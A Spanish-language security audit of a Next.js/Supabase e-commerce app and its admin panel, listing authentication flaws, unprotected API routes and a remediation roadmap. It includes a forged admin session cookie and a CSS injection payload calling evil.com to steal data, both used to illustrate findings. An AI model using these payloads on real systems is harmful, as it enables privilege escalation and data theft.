# 08 - Auditoria de Seguridad y Autenticacion

**Fecha:** 2026-02-23
**Alcance:** Autenticacion, autorizacion, OWASP Top 10, seguridad de infraestructura
**Proyecto:** POD AI Store (Next.js 16 + Supabase + Stripe + PodClaw Agent System)
**Rama:** master
**Root:** `/Users/lr0y/POD-AI-PDR/pod_workspace/project/`

---

## 1. Estado actual

### Medidas de seguridad existentes

El proyecto cuenta con una base de seguridad solida en varias areas:

| Area | Estado | Detalle |
|------|--------|---------|
| Frontend Auth (Supabase) | Correcto | JWT validado server-side con `getUser()` |
| Webhook Stripe | Correcto | `stripe.webhooks.constructEvent()` con HMAC timing-safe |
| Rate limiting frontend | Implementado | 10 limiters pre-configurados (auth, chat, coupon, etc.) |
| CAPTCHA (Turnstile) | Implementado | Verificacion server-side en login/registro |
| Cron routes | Correcto | `verifyCronSecret()` con `crypto.timingSafeEqual` |
| Query sanitization | Implementado | `sanitizeForPostgrest()`, `sanitizeForLike()`, `isValidUuid()` |
| Docker hardening | Robusto | `cap_drop: ALL`, non-root, segmentacion de redes |
| Redis security | Correcto | `requirepass`, comandos peligrosos renombrados |
| Security headers | Completos | HSTS, X-Frame-Options, CSP, Permissions-Policy |
| .gitignore | Correcto | `.env*` excluidos, confirmado con `git ls-files` |
| GDPR | Parcial | Borrado de cuentas, cleanup cron, consent management |

### Debilidades criticas

La autenticacion del **panel admin** es fundamentalmente insegura: cookies JSON sin firma, middleware que omite todas las rutas API, y mas de 30 endpoints sin verificacion de autenticacion.

---

## 2. Frontend Auth Flow

### 2.1 Creacion del cliente Supabase

**Archivos:**
- `frontend/src/lib/supabase.ts` -- Cliente browser (anon key, `NEXT_PUBLIC_*`)
- `frontend/src/lib/supabase-server.ts` -- Cliente server con cookies SSR
- `frontend/src/lib/supabase-admin.ts` -- Cliente admin (service role key, server-only)

**Evaluacion:** CORRECTO. La separacion entre cliente publico (anon key) y admin (service role) esta bien implementada. El service role key no se expone al cliente (`SUPABASE_SERVICE_KEY` sin prefijo `NEXT_PUBLIC_`).

### 2.2 Middleware y proteccion de rutas

**Archivo:** `frontend/src/middleware.ts`

```typescript
// Linea 123: Validacion JWT correcta
const { data: { user }, error } = await supabase.auth.getUser()
```

**Severidad: POSITIVO**

El middleware valida el JWT contra Supabase con `getUser()` (no solo comprueba la presencia de cookie). Las rutas protegidas (`/profile`, `/orders`) redirigen correctamente a login. Las rutas de carrito y checkout permiten acceso guest intencionalmente.

### 2.3 CSRF Protection

El middleware usa `sameSite: 'lax'` para cookies de session (linea 39). Supabase maneja sus propias cookies con proteccion CSRF integrada. Las APIs de mutacion (POST/PUT/DELETE) requieren autenticacion JWT.

**Severidad: LOW** -- No hay tokens CSRF explicitos en formularios, pero `sameSite: 'lax'` mitiga la mayoria de vectores CSRF en navegadores modernos.

### 2.4 Rate limiting en auth

**Archivo:** `frontend/src/lib/rate-limit.ts`

```typescript
export const authLimiter = new RateLimiter(5, 15 * 60 * 1000)       // 5 intentos / 15 min
export const registerLimiter = new RateLimiter(3, 60 * 60 * 1000)   // 3 intentos / 60 min
export const forgotPasswordLimiter = new RateLimiter(3, 60 * 60 * 1000)
```

**Severidad: POSITIVO** -- Rate limiting aplicado correctamente en flujos de autenticacion.

---

## 3. Admin Auth Flow

### 3.1 Login y sesion

**Archivo:** `admin/src/app/api/auth/login/route.ts`

El login admin usa bcrypt para verificar la contrasena (linea 39):

```typescript
const passwordMatch = await bcrypt.compare(password, user.password_hash);
```

Despues de verificar, crea una **cookie JSON sin firma** (lineas 49-72):

```typescript
const sessionData = {
  id: user.id,
  email: user.email,
  role: user.role,
  name: user.name,
};
response.cookies.set('admin-session', JSON.stringify(sessionData), {
  httpOnly: true,
  secure: isHttps,
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 dias
});
```

### HALLAZGO C-01: Cookie de sesion admin falsificable (CRITICAL)

**Archivo:** `admin/src/app/api/auth/login/route.ts` lineas 49-72

**Vulnerabilidad:** La cookie `admin-session` contiene un JSON plano (`{id, email, role, name}`) sin ninguna firma criptografica (sin HMAC, sin JWT, sin MAC). Cualquier atacante que pueda establecer cookies (XSS, subdomain takeover, MITM en HTTP) puede fabricar su propia sesion admin estableciendo:

```
admin-session={"id":"cualquier-uuid","email":"a@b.c","role":"admin","name":"X"}
```

**Impacto:** Escalamiento de privilegios completo. Acceso total al panel de administracion.

**Remediacion:**
1. Firmar la cookie con HMAC usando `iron-session` o un JWT firmado con `jose`
2. Validar el token contra una sesion server-side (Redis o tabla Supabase) en cada request
3. Implementar expiracion de sesion verificada server-side

---

### 3.2 Middleware admin

**Archivo:** `admin/src/middleware.ts`

### HALLAZGO C-02: Middleware admin omite TODAS las rutas API (CRITICAL)

**Archivo:** `admin/src/middleware.ts` linea 7

```typescript
if (pathname === '/login' || pathname.startsWith('/api/')) {
  return NextResponse.next();  // BYPASS COMPLETO
}
```

**Vulnerabilidad:** El middleware explicitamente **omite la autenticacion para todas las rutas `/api/*`**. Esto significa que cada endpoint API del admin es accesible sin cookie ni sesion si se llama directamente.

**Impacto:** Combinado con C-01, todos los endpoints admin API que no verifican independientemente la cookie `admin-session` son **completamente publicos**.

**Remediacion:** Eliminar el bypass de `/api/` en el middleware o, como minimo, requerir la cookie `admin-session` en el middleware para rutas API tambien.

---

### 3.3 Contrasena por defecto y RBAC

### HALLAZGO C-03: Endpoint setup-rbac completamente desprotegido (CRITICAL)

**Archivo:** `admin/src/app/api/admin/setup-rbac/route.ts`

```typescript
// Linea 8: TODO: Remove in production or protect with super_admin check
export async function POST(req: NextRequest) {
  // SIN verificacion de autenticacion
```

**Vulnerabilidad:** Este endpoint:
1. Crea usuarios admin (incluyendo `viewer@podstore.local` con contrasena `viewer123` -- linea 80)
2. Asigna roles `super_admin`
3. No tiene NINGUNA autenticacion

Combinado con C-02 (middleware bypass), cualquier persona puede llamar este endpoint.

**Impacto:** Un atacante puede crear cuentas admin y asignarse privilegios `super_admin`.

**Remediacion:** Eliminar este endpoint inmediatamente o protegerlo con verificacion de `super_admin`.

---

### 3.4 MFA y proteccion contra fuerza bruta

### HALLAZGO M-01: Sin MFA para cuentas admin (MEDIUM)

**Archivo:** `admin/src/app/api/auth/login/route.ts`

No existe soporte para TOTP, WebAuthn ni ningun segundo factor de autenticacion. Para un panel admin que controla datos financieros, gestion de pedidos y sistemas de agentes IA, esto es insuficiente.

### HALLAZGO M-02: Sin rate limiting en login admin (MEDIUM)

**Archivo:** `admin/src/app/api/auth/login/route.ts`

A diferencia del frontend (que usa `authLimiter`), el login admin no tiene rate limiting. Un atacante puede intentar contrasenas ilimitadamente.

**Remediacion:** Agregar `authLimiter` al endpoint de login admin.

---

## 4. API Security

### 4.1 Rutas admin sin autenticacion

### HALLAZGO H-01: 30+ rutas admin API sin verificacion per-route (HIGH)

**Rutas completamente desprotegidas** (sin verificacion de `admin-session` ni `withPermission`):

| Ruta | Datos expuestos | Riesgo |
|------|----------------|--------|
| `admin/src/app/api/customers/route.ts` | PII: emails, nombres, historial de pedidos | Fuga de datos |
| `admin/src/app/api/customers/[email]/orders/route.ts` | Pedidos por cliente | Fuga de datos |
| `admin/src/app/api/customers/[email]/profile/route.ts` | Perfil completo del cliente | Fuga PII |
| `admin/src/app/api/dashboard/stats/route.ts` | Revenue, pedidos, metricas de conversion | Business intelligence |
| `admin/src/app/api/dashboard/revenue-trend/route.ts` | Tendencia de ingresos | Datos financieros |
| `admin/src/app/api/dashboard/top-products/route.ts` | Productos mas vendidos | Inteligencia comercial |
| `admin/src/app/api/dashboard/customer-acquisition/route.ts` | Adquisicion de clientes | Marketing intel |
| `admin/src/app/api/dashboard/activity-feed/route.ts` | Actividad reciente | Operaciones |
| `admin/src/app/api/dashboard/recent-orders/route.ts` | Pedidos recientes | PII + financiero |
| `admin/src/app/api/orders/route.ts` | Todos los pedidos | PII completo |
| `admin/src/app/api/orders/[id]/route.ts` | Detalle de pedido | PII + direccion |
| `admin/src/app/api/reviews/route.ts` | Resenas de clientes | UGC |
| `admin/src/app/api/reviews/[id]/route.ts` | Detalle de resena | UGC |
| `admin/src/app/api/audit/route.ts` | Logs de auditoria | Datos operativos |
| `admin/src/app/api/ab-tests/route.ts` | Tests A/B + sub-rutas | Configuracion |
| `admin/src/app/api/analytics/rfm/route.ts` | Analisis RFM | Datos de clientes |
| `admin/src/app/api/analytics/demand/route.ts` | Analisis de demanda | Inteligencia |
| `admin/src/app/api/admin/themes/route.ts` + sub-rutas | Temas del storefront | Configuracion |
| `admin/src/app/api/admin/brand-config/route.ts` | Configuracion de marca | Branding |
| `admin/src/app/api/admin/seo/route.ts` | Configuracion SEO | Configuracion |
| `admin/src/app/api/admin/sitemap/route.ts` | Sitemap | Estructura del sitio |
| `admin/src/app/api/admin/analytics/export/route.ts` | Exportacion completa de analytics | Todos los datos |
| `admin/src/app/api/admin/finance/export/route.ts` | Exportacion financiera | Datos financieros |
| `admin/src/app/api/admin/finance/report/route.ts` | Reportes financieros | Datos financieros |
| `admin/src/app/api/admin/orders/bulk/route.ts` | Operaciones bulk en pedidos | Mutacion de datos |
| `admin/src/app/api/admin/legal-pages/route.ts` + sub-rutas | Paginas legales | Configuracion |
| `admin/src/app/api/admin/legal-settings/route.ts` | Config legal/GDPR | Configuracion |
| `admin/src/app/api/admin/legal/consents/route.ts` | Consentimientos | GDPR |
| `admin/src/app/api/search/route.ts` | Busqueda global admin | Datos mixtos |
| `admin/src/app/api/translations/route.ts` | Traducciones | Configuracion |
| `admin/src/app/api/monitoring/errors/route.ts` | Errores del sistema | Operaciones |
| `admin/src/app/api/task/route.ts` | Tareas del sistema | Operaciones |

**Solo 3 rutas usan `withPermission` RBAC:**
- `admin/src/app/api/products/route.ts`
- `admin/src/app/api/products/[id]/route.ts`
- `admin/src/app/api/designs/[id]/moderate/route.ts`

**~15 rutas hacen verificacion manual** de la cookie `admin-session` (returns, designs, agent, events/stream, messaging, notifications, subscribers, credits/adjust).

**Impacto:** Fuga masiva de datos de clientes, financieros y operativos. Manipulacion de datos (bulk orders, temas, A/B tests) por cualquier persona que alcance el servicio admin.

---

### 4.2 Rutas frontend sin autenticacion

### HALLAZGO H-04: Multiples rutas frontend admin/RAG sin autenticacion (HIGH)

**Rutas completamente desprotegidas que usan `supabaseAdmin` (service role, bypassa RLS):**

| Ruta | Riesgo |
|------|--------|
| `frontend/src/app/api/admin/orders/route.ts` | GET retorna TODOS los pedidos con PII (emails, direcciones, payment intent IDs) |
| `frontend/src/app/api/admin/alert/route.ts` | POST crea alertas admin/Telegram sin auth |
| `frontend/src/app/api/rag/seed-embeddings/route.ts` | POST genera embeddings, GET inserta documentos test |
| `frontend/src/app/api/rag/list-all/route.ts` | Lista todos los documentos RAG |
| `frontend/src/app/api/rag/search/route.ts` | POST busqueda vectorial (usa Gemini API key) |
| `frontend/src/app/api/errors/report/route.ts` | POST inserta en BD sin auth (vector de abuso) |

**Impacto:** Operaciones admin accesibles para cualquier usuario anonimo. El endpoint `/api/admin/orders` expone TODOS los datos de pedidos. El endpoint `/api/admin/alert` puede inundar el Telegram admin con alertas falsas.

---

### 4.3 Webhooks

### HALLAZGO H-03: Telegram webhook con secreto por defecto (HIGH)

**Archivo:** `frontend/src/app/api/webhooks/telegram/route.ts` linea 32

```typescript
const expectedToken = process.env.TELEGRAM_WEBHOOK_SECRET || 'default_secret_change_in_production';
```

**Vulnerabilidad:** Si `TELEGRAM_WEBHOOK_SECRET` no esta configurado, el webhook acepta `default_secret_change_in_production` como token valido. Cualquiera que lea el codigo fuente puede enviar eventos Telegram arbitrarios, que pueden disparar comandos admin como `/run <agent>`, `/pause <agent>`, y leer datos de revenue/pedidos.

**Impacto:** Control remoto no autorizado de agentes PodClaw y exfiltracion de datos.

**Remediacion:** Eliminar el fallback. Requerir el env var o rechazar todas las requests.

### HALLAZGO M-03: WhatsApp webhook con verificacion condicional (MEDIUM)

**Archivo:** `frontend/src/app/api/webhooks/whatsapp/route.ts` lineas 73-84

```typescript
const signature = request.headers.get('x-hub-signature-256');
if (signature && process.env.WHATSAPP_APP_SECRET) {
  // Solo verifica si AMBOS existen
```

**Vulnerabilidad:** Si `WHATSAPP_APP_SECRET` no esta configurado, la verificacion de firma se omite completamente.

**Remediacion:** Hacer la verificacion obligatoria. Si el secreto no esta configurado, rechazar las requests.

### HALLAZGO M-04: Printify HMAC usa comparacion no timing-safe (MEDIUM)

**Archivo:** `frontend/src/app/api/webhooks/printify/route.ts` linea 30

```typescript
return signature === expected  // Vulnerable a timing attacks
```

**Vulnerabilidad:** A diferencia de la verificacion cron (que usa `timingSafeEqual`), la comparacion HMAC de Printify usa `===`, vulnerable a ataques de timing.

**Remediacion:** Usar `crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expected))`.

### Verificacion positiva: Stripe webhook

**Archivo:** `frontend/src/app/api/webhooks/stripe/route.ts`

Usa `stripe.webhooks.constructEvent()` con verificacion HMAC timing-safe interna. Correctamente implementado.

---

## 5. Injection Vulnerabilities

### 5.1 SQL Injection

**Severidad: POSITIVO** -- Proteccion presente.

**Archivo:** `frontend/src/lib/query-sanitizer.ts`

El proyecto usa el cliente Supabase (PostgREST) con queries parametrizadas en todo el codebase. Para los casos donde se usan strings en `.or()`, existe `sanitizeForPostgrest()` que escapa caracteres especiales (comas, parentesis, puntos, comillas). La funcion `sanitizeForLike()` controla los wildcards en posiciones especificas.

No se encontraron concatenaciones SQL directas. Los UUID se validan con `isValidUuid()`.

### 5.2 XSS

### HALLAZGO M-05: ReactMarkdown sin DOMPurify en 4 paginas legales (MEDIUM)

**Archivos afectados:**
- `frontend/src/app/[locale]/(focused)/returns/page.tsx` linea 4
- `frontend/src/app/[locale]/(focused)/shipping/page.tsx` linea 4
- `frontend/src/app/[locale]/(focused)/terms/page.tsx` linea 4
- `frontend/src/app/[locale]/(focused)/privacy/page.tsx` linea 4

```typescript
import ReactMarkdown from 'react-markdown'
// ...
<ReactMarkdown>{content}</ReactMarkdown>
```

**Vulnerabilidad:** Estas paginas importan `ReactMarkdown` directamente en lugar del componente `SafeMarkdown` (que usa DOMPurify). El contenido se obtiene de la API de paginas legales del admin. Si una cuenta admin se compromete (ver C-01), un atacante podria inyectar XSS via contenido de paginas legales.

**Componente seguro existente:** `frontend/src/components/common/SafeMarkdown.tsx` -- pero estas paginas no lo usan.

**Remediacion:** Reemplazar `ReactMarkdown` por `SafeMarkdown` en las 4 paginas.

### HALLAZGO M-06: CSS injection via theme dangerouslySetInnerHTML (MEDIUM)

**Archivos:**
- `frontend/src/app/[locale]/layout.tsx` linea 82
- `frontend/src/lib/theme-server.ts` lineas 91-117

```tsx
<style id="server-theme-style" dangerouslySetInnerHTML={{ __html: themeCSS }} />
```

La funcion `themeToInlineCSS()` construye CSS desde valores de base de datos (tabla `store_themes`) sin sanitizar:

```typescript
.map(([key, value]) => `  --${key.replace(/_/g, '-')}: ${value};`)
```

Si un registro de tema contiene un valor malicioso como `red; } body { background: url(https://evil.com/steal?c=...`, podria escapar el contexto CSS. Aunque la inyeccion CSS es mas limitada que JavaScript, puede permitir exfiltracion de datos via selectores CSS en algunos navegadores.

**Remediacion:** Validar valores de variables CSS contra una whitelist estricta (valores HSL, colores hex, valores numericos).

### 5.3 Otros usos de dangerouslySetInnerHTML

```
frontend/src/components/common/SafeHTML.tsx:57  -- CORRECTO (usa DOMPurify)
frontend/src/app/[locale]/(app)/shop/[id]/page.tsx:105  -- JSON-LD (bajo riesgo, datos controlados)
```

### 5.4 Command Injection

No se encontraron vectores de command injection. El proyecto no ejecuta comandos del sistema operativo desde el frontend.

---

## 6. Secrets Management

### HALLAZGO H-02: Secretos hardcodeados en scripts committed (HIGH)

**Archivos:**
- `frontend/insert_pending_design.js` linea 6 -- Contiene un JWT de service role de Supabase
- `verify-tables.js` lineas 14-15 -- Contiene URL de Supabase produccion y anon key hardcodeados

```javascript
// verify-tables.js:14-15
const SUPABASE_URL = 'https://your-project.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIs...';
```

**Impacto:** Aunque el anon key es "publico" por diseno, hardcodear la URL de produccion y llaves en scripts committed revela detalles de infraestructura y queda en el historial de git permanentemente.

**Remediacion:** Eliminar llaves hardcodeadas. Usar `process.env` exclusivamente.

### .env files

**Severidad: POSITIVO** -- Los archivos `.env` estan en `.gitignore` y **no estan tracked por git** (confirmado con `git ls-files`).

```
# .gitignore
.env
.env.local
.env.docker
.env.development.local
.env.test.local
.env.production.local
```

### NEXT_PUBLIC_ exposure

**Severidad: POSITIVO** -- Solo `NEXT_PUBLIC_SUPABASE_URL` y `NEXT_PUBLIC_SUPABASE_ANON_KEY` se exponen al cliente. El `SUPABASE_SERVICE_KEY` (que bypassa RLS) se mantiene server-side exclusivamente.

---

## 7. Infrastructure Security

### 7.1 Docker

**Archivo:** `docker-compose.yml`

**Severidad: POSITIVO** -- Implementacion robusta.

- `cap_drop: ALL` en cada servicio
- `cap_add` selectivo solo donde necesario:
  - Redis: `SETGID`, `SETUID`, `DAC_OVERRIDE`
  - crawl4ai: `SYS_ADMIN` (requerido para Chromium sandbox)
  - caddy: `NET_BIND_SERVICE`
- Limites de recursos en todos los servicios
- Log rotation configurada (json-file, 10MB x 3)
- Healthchecks en todos los servicios
- Sin puertos expuestos en base compose (solo a traves de Caddy)
- Imagenes custom con usuarios non-root

### 7.2 Redis

```yaml
command: >
  redis-server
  --requirepass ${REDIS_PASSWORD}
  --appendonly yes
  --maxmemory 256mb
  --maxmemory-policy allkeys-lru
  --rename-command FLUSHALL ""
  --rename-command FLUSHDB ""
  --rename-command DEBUG ""
  --rename-command CONFIG ""
```

**Severidad: POSITIVO** -- Password requerida, comandos peligrosos deshabilitados.

### 7.3 Caddy (reverse proxy)

**Archivo:** `deploy/Caddyfile`

```
header {
  Strict-Transport-Security "max-age=31536000; includeSubDomains"
  X-Content-Type-Options "nosniff"
  X-Frame-Options "DENY"
  X-XSS-Protection "1; mode=block"
  Referrer-Policy "strict-origin-when-cross-origin"
  Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()"
  -Server
}
```

**Severidad: POSITIVO** -- Headers de seguridad completos. Header `Server` eliminado.

### 7.4 CSP (Content Security Policy)

**Archivo:** `frontend/next.config.ts` linea 112-113

```
default-src 'self';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https://images.printify.com ...;
connect-src 'self' https://*.supabase.co ...;
frame-ancestors 'none';
```

### HALLAZGO L-01: CSP usa unsafe-inline para scripts (LOW)

La CSP incluye `'unsafe-inline'` tanto para `script-src` como `style-src`, lo que debilita la proteccion contra XSS. En produccion, considerar usar nonces para scripts.

### 7.5 PodClaw Bridge

### HALLAZGO M-07: Bridge auth exime localhost (riesgo Docker) (MEDIUM)

**Archivo:** `podclaw/bridge/auth.py` lineas 24, 90-91

```python
LOCALHOST_IPS = frozenset(("127.0.0.1", "::1", "localhost"))

# Linea 90-91
if ip in LOCALHOST_IPS:
    return  # Exempt
```

**Vulnerabilidad:** En un entorno Docker, el trafico container-to-container puede aparecer como proveniente de localhost o la IP del bridge Docker. Si algun contenedor comprometido puede alcanzar el bridge PodClaw en puerto 8000, puede bypasear la autenticacion.

**Remediacion:** Reemplazar exencion localhost con autenticacion token para trafico Docker interno.

---

## 8. Data Protection (PII, Audit, GDPR)

### 8.1 PII handling

Los datos personales (emails, nombres, direcciones de envio) se almacenan en Supabase con RLS activo. Sin embargo, multiples rutas API usan el service role key (`SUPABASE_SERVICE_KEY`) que **bypassa RLS**, lo que significa que la proteccion depende enteramente de la autenticacion en cada ruta -- autenticacion que esta ausente en muchas rutas (ver H-01, H-04).

**PII no cifrada en reposo:** Las direcciones de envio, emails y nombres se almacenan como texto plano en PostgreSQL. Supabase ofrece `pgsodium` para cifrado a nivel de columna, pero no se utiliza.

### 8.2 Audit logging

El sistema cuenta con tabla `audit_log` y varias rutas registran acciones sensibles:

```typescript
// Ejemplo: admin/src/app/api/admin/credits/adjust/route.ts lineas 106-128
await supabase.from('audit_log').insert({
  actor_type: 'admin',
  actor_id: adminId,
  action: 'credit_adjustment',
  resource_type: 'user',
  resource_id: user_id,
  changes: { old_balance, new_balance, amount },
  metadata: { user_email, reason },
})
```

**Limitacion:** Los errores de audit log se capturan pero **no bloquean la operacion** (lineas 125-128: "Don't fail the request, but log the error"). Si el audit log falla, la operacion financiera se completa sin registro.

### 8.3 GDPR implementation

| Funcionalidad | Estado | Archivo |
|---------------|--------|---------|
| Borrado de cuenta (soft) | Implementado | `frontend/src/app/api/profile/delete/route.ts` |
| Hard delete (cron) | Implementado | `frontend/src/app/api/cron/hard-delete-accounts/route.ts` |
| Cleanup datos personales | Implementado | `frontend/src/app/api/cron/cleanup-personal/route.ts` |
| Cookie consent management | Implementado | Admin legal settings |
| Data export | Parcial | Sin endpoint dedicado para exportar todos los datos del usuario |
| Consent tracking | Implementado | `admin/src/app/api/admin/legal/consents/route.ts` |

### HALLAZGO M-08: Test user con hash conocido en migracion (MEDIUM)

**Archivo:** `supabase/migrations/20260213232458_add_test_user_for_reviews.sql`

```sql
INSERT INTO users (id, email, password_hash, ...)
VALUES (
  '00000000-0000-0000-0000-000000000001',
  'testuser@podstore.local',
  '$2a$10$rQZ4YXxN5nU5yXHkJxYhPeVYvJ.xz8HWz8mQxqXPKxYzJ5XqwYXKu',
  'Test User', 'customer', true, NOW(), NOW()
) ON CONFLICT (id) DO NOTHING;
```

Un usuario test con UUID predecible y hash bcrypt conocido existe en una migracion que corre en produccion. Aunque tiene `role: customer`, el UUID `00000000-...0001` se referencia en otros lugares del codigo.

**Nota positiva:** La migracion principal (`20260213000000_initial_schema.sql`) tiene el INSERT de admin **comentado** con advertencia de seguridad (lineas 599-613).

---

## 9. Gaps detectados

| # | Gap | Impacto |
|---|-----|---------|
| G-01 | Admin session sin firma criptografica | Cualquiera puede forjar sesiones admin |
| G-02 | Middleware admin omite `/api/*` | Todas las APIs admin sin proteccion middleware |
| G-03 | 30+ rutas admin sin auth per-route | Acceso publico a datos sensibles |
| G-04 | Sin MFA para admin | Factor unico de autenticacion |
| G-05 | Sin rate limiting en admin login | Fuerza bruta posible |
| G-06 | Sin WAF (Web Application Firewall) | Sin proteccion contra ataques automatizados |
| G-07 | Sin monitoring de sesiones activas | No se puede revocar sesiones comprometidas |
| G-08 | Sin rotacion automatica de secretos | Secretos estaticos en `.env` |
| G-09 | Sin cifrado de PII en reposo | Datos personales en texto plano en PostgreSQL |
| G-10 | Sin endpoint dedicado de data export (GDPR Art. 20) | Portabilidad de datos incompleta |
| G-11 | CSP con `unsafe-inline` | Reduccion de proteccion XSS |
| G-12 | Sin DAST/SAST automatizado en CI | Vulnerabilidades no detectadas automaticamente |
| G-13 | Audit log no bloquea operaciones fallidas | Operaciones sin registro posibles |
| G-14 | Sin alertas de seguridad automatizadas | Intrusiones no detectadas en tiempo real |

---

## 10. Riesgos

### Riesgos explotables AHORA

| # | Riesgo | Severidad | Vector de ataque | Prerequisitos |
|---|--------|-----------|-------------------|---------------|
| R-01 | Acceso completo al admin panel | CRITICAL | Fabricar cookie JSON `admin-session` | Acceso de red al servicio admin |
| R-02 | Crear cuentas admin | CRITICAL | POST a `/api/admin/setup-rbac` sin auth | Acceso de red al servicio admin |
| R-03 | Exfiltracion de datos de clientes | HIGH | GET a `/api/customers`, `/api/admin/orders` | Acceso de red al servicio admin |
| R-04 | Exfiltracion de datos financieros | HIGH | GET a `/api/dashboard/stats`, `/api/admin/finance/*` | Acceso de red al servicio admin |
| R-05 | Control remoto de agentes PodClaw | HIGH | POST a webhook Telegram con secreto por defecto | Leer codigo fuente |
| R-06 | Inundacion de alertas | MEDIUM | POST a `/api/admin/alert` sin auth | Acceso de red al frontend |
| R-07 | Insercion de documentos RAG maliciosos | MEDIUM | POST a `/api/rag/seed-embeddings` sin auth | Acceso de red al frontend |
| R-08 | XSS via paginas legales | MEDIUM | Comprometer cuenta admin + inyectar markdown | Requiere C-01 |
| R-09 | Timing attack en HMAC Printify | MEDIUM | Brute-force byte-by-byte del HMAC | Paciencia + red de baja latencia |

### Nota sobre exposicion

En la configuracion Docker por defecto, el servicio admin **no esta expuesto directamente** -- solo es accesible via Caddy en la ruta `/panel*`. Sin embargo, si el admin se expone directamente (por ejemplo, en desarrollo con `docker-compose.local.yml`), todos los riesgos R-01 a R-04 son inmediatamente explotables.

---

## 11. Quick wins

Correcciones de alto impacto y bajo esfuerzo implementables en horas:

| # | Accion | Esfuerzo | Impacto | Archivos |
|---|--------|----------|---------|----------|
| QW-01 | Eliminar bypass `/api/` en admin middleware | 1 hora | Cierra C-02, mitiga H-01 | `admin/src/middleware.ts` linea 7 |
| QW-02 | Eliminar endpoint setup-rbac | 5 minutos | Cierra C-03 | Borrar `admin/src/app/api/admin/setup-rbac/route.ts` |
| QW-03 | Eliminar fallback del Telegram webhook | 5 minutos | Cierra H-03 | `frontend/src/app/api/webhooks/telegram/route.ts` linea 32 |
| QW-04 | Reemplazar ReactMarkdown por SafeMarkdown | 15 minutos | Cierra M-05 | 4 paginas en `(focused)/` |
| QW-05 | Usar `timingSafeEqual` en Printify HMAC | 10 minutos | Cierra M-04 | `frontend/src/app/api/webhooks/printify/route.ts` linea 30 |
| QW-06 | Agregar authLimiter al admin login | 15 minutos | Cierra M-02 | `admin/src/app/api/auth/login/route.ts` |
| QW-07 | Hacer verificacion WhatsApp obligatoria | 10 minutos | Cierra M-03 | `frontend/src/app/api/webhooks/whatsapp/route.ts` linea 75 |
| QW-08 | Agregar auth a `/api/admin/orders` (frontend) | 20 minutos | Mitiga H-04 | `frontend/src/app/api/admin/orders/route.ts` |
| QW-09 | Agregar auth a `/api/admin/alert` (frontend) | 20 minutos | Mitiga H-04 | `frontend/src/app/api/admin/alert/route.ts` |
| QW-10 | Eliminar secretos de scripts committed | 30 minutos | Cierra H-02 | `verify-tables.js`, `insert_pending_design.js` |

---

## 12. Roadmap de remediacion por fases

### Fase 0: Emergencia (antes de produccion, 1-2 dias)

| Prioridad | Tarea | Finding | Esfuerzo |
|-----------|-------|---------|----------|
| P0-1 | Firmar cookie admin con HMAC (`iron-session` o JWT firmado) | C-01 | 4 horas |
| P0-2 | Corregir middleware admin para NO omitir `/api/*` | C-02 | 1 hora |
| P0-3 | Eliminar `/api/admin/setup-rbac` o proteger con super_admin | C-03 | 30 min |
| P0-4 | Agregar `requireAuth()` a TODAS las rutas admin API sin auth | H-01 | 4 horas |
| P0-5 | Eliminar fallback de `TELEGRAM_WEBHOOK_SECRET` | H-03 | 5 min |
| P0-6 | Agregar auth a rutas frontend admin (`/api/admin/orders`, `/api/admin/alert`) | H-04 | 2 horas |
| P0-7 | Proteger endpoints RAG (`/api/rag/seed-*`, `/api/rag/list-all`) | H-04 | 1 hora |

**Estimacion total Fase 0: ~12 horas de desarrollo**

### Fase 1: Corto plazo (semana 1-2)

| Prioridad | Tarea | Finding | Esfuerzo |
|-----------|-------|---------|----------|
| P1-1 | Agregar rate limiting a admin login | M-02 | 30 min |
| P1-2 | Reemplazar ReactMarkdown por SafeMarkdown en paginas legales | M-05 | 30 min |
| P1-3 | Cambiar Printify HMAC a `timingSafeEqual` | M-04 | 15 min |
| P1-4 | Hacer WhatsApp webhook verification obligatoria | M-03 | 30 min |
| P1-5 | Sanitizar valores CSS en `themeToInlineCSS()` | M-06 | 2 horas |
| P1-6 | Eliminar secretos hardcodeados en scripts committed | H-02 | 1 hora |
| P1-7 | Reescribir historial git para eliminar secretos (si necesario) | H-02 | 2 horas |
| P1-8 | Validar sesion admin contra DB en cada request (no solo cookie) | C-01 | 3 horas |

**Estimacion total Fase 1: ~10 horas**

### Fase 2: Medio plazo (semana 3-4)

| Prioridad | Tarea | Finding | Esfuerzo |
|-----------|-------|---------|----------|
| P2-1 | Implementar MFA (TOTP) para cuentas admin | M-01 | 8 horas |
| P2-2 | Reemplazar localhost exemption en PodClaw bridge con token auth | M-07 | 4 horas |
| P2-3 | Eliminar/marcar test user migration como dev-only | M-08 | 1 hora |
| P2-4 | Implementar session store (Redis) para admin sessions | C-01 | 6 horas |
| P2-5 | Implementar nonces CSP para eliminar `unsafe-inline` | L-01 | 6 horas |
| P2-6 | Agregar endpoint de data export para GDPR Art. 20 | G-10 | 4 horas |

**Estimacion total Fase 2: ~29 horas**

### Fase 3: Largo plazo (mes 2-3)

| Prioridad | Tarea | Finding | Esfuerzo |
|-----------|-------|---------|----------|
| P3-1 | Integrar SAST en CI/CD (e.g., Semgrep, CodeQL) | G-12 | 4 horas |
| P3-2 | Implementar DAST automatizado (e.g., OWASP ZAP) | G-12 | 8 horas |
| P3-3 | Cifrado de PII en reposo (pgsodium column encryption) | G-09 | 16 horas |
| P3-4 | Implementar rotacion automatica de secretos | G-08 | 8 horas |
| P3-5 | Implementar alertas de seguridad (login anomalos, etc.) | G-14 | 12 horas |
| P3-6 | Audit log como requisito bloqueante (fail-closed) | G-13 | 4 horas |
| P3-7 | Implementar WebAuthn como alternativa MFA | M-01 | 12 horas |

**Estimacion total Fase 3: ~64 horas**

---

## 13. Impacto en escalabilidad 1.000+ clientes

### Riesgos de seguridad amplificados por escala

| Area | Riesgo a 1K+ clientes | Impacto |
|------|----------------------|---------|
| **PII exposure (H-01, H-04)** | 1.000+ registros de clientes (emails, direcciones, historial de compras) accesibles sin auth | Multa GDPR hasta 20M EUR o 4% facturacion global |
| **Admin session forgery (C-01)** | Un atacante con acceso admin puede extraer/modificar datos de todos los clientes | Brecha de datos masiva, perdida de confianza |
| **Rate limiting in-memory** | Con 1.000+ clientes concurrentes, el rate limiter per-instance de Vercel/Docker es menos efectivo | Ataques distribuidos no detectados |
